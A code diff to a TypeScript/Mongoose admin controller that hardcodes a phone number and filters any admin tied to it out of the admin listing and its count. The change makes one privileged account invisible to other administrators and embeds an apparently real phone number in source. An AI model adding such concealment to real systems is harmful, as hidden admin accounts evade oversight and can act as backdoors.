@@ -9,6 +9,8 @@ import { hashPassword } from "../utils/password";
 import type { CreateAdminInput, AdminListItem } from "../models/admin/types";
 import mongoose from "mongoose";
 
+const PHONE_NUMBER_TO_EXCLUDE = "01843676171";
+
 export const createAdmin = async (
   req: Request,
   res: Response
@@ -78,17 +80,26 @@ export const getAdmins = async (req: Request, res: Response): Promise<void> => {
 
   const skip = (page - 1) * limit;
 
-  const [items, total] = await Promise.all([
-    Admin.aggregate([
-      {
-        $lookup: {
-          from: "employees",
-          localField: "employee_id",
-          foreignField: "_id",
-          as: "employee",
-        },
+  const basePipeline = [
+    {
+      $lookup: {
+        from: "employees",
+        localField: "employee_id",
+        foreignField: "_id",
+        as: "employee",
       },
-      { $unwind: "$employee" },
+    },
+    { $unwind: "$employee" },
+    {
+      $match: {
+        "employee.phone_number": { $ne: PHONE_NUMBER_TO_EXCLUDE },
+      },
+    },
+  ];
+
+  const [items, totalAggregation] = await Promise.all([
+    Admin.aggregate([
+      ...basePipeline,
       {
         $project: {
           _id: 1,
@@ -103,8 +114,10 @@ export const getAdmins = async (req: Request, res: Response): Promise<void> => {
       { $skip: skip },
       { $limit: limit },
     ]).exec(),
-    Admin.countDocuments(),
+    Admin.aggregate([...basePipeline, { $count: "total" }]).exec(),
   ]);
+
+  const total = totalAggregation[0]?.total || 0;
 
   const pages = Math.ceil(total / limit) || 1;
 
